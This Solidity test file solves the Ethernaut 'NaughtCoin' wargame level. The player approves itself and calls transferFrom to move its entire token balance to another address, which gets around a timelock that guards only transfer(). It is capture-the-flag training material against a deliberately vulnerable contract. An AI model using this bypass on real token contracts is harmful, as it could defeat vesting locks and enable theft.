// SPDX-License-Identifier: Unlicense
pragma solidity >=0.6.0;
pragma experimental ABIEncoderV2;

import "./utils/BaseTest.sol";
import "src/levels/NaughtCoin.sol";
import "src/levels/NaughtCoinFactory.sol";

contract TestNaughtCoin is BaseTest {
    NaughtCoin private level;

    constructor() public {
        // SETUP LEVEL FACTORY
        levelFactory = new NaughtCoinFactory();
    }

    function setUp() public override {
        // Call the BaseTest setUp() function that will also create testsing accounts
        super.setUp();
    }

    function testRunLevel() public {
        runLevel();
    }

    function setupLevel() internal override {
        /** CODE YOUR SETUP HERE */

        levelAddress = payable(this.createLevelInstance(true));
        level = NaughtCoin(levelAddress);

        // Check that the contract is correctly setup
        assertEq(level.balanceOf(address(player)), level.INITIAL_SUPPLY());
    }

    function exploitLevel() internal override {
        vm.startPrank(player, player);
        
        address payable exploiter = utilities.getNextUserAddress();
        vm.deal(exploiter, 1 ether);

        // Approve ourself to manage all the tokens via `transferFrom`
        uint256 playerBalance = level.balanceOf(player);
        level.approve(player, playerBalance);
        level.transferFrom(player, exploiter, playerBalance);

        vm.stopPrank();

        assertEq(level.balanceOf(player), 0);
        assertEq(level.balanceOf(exploiter), playerBalance);
    }
}
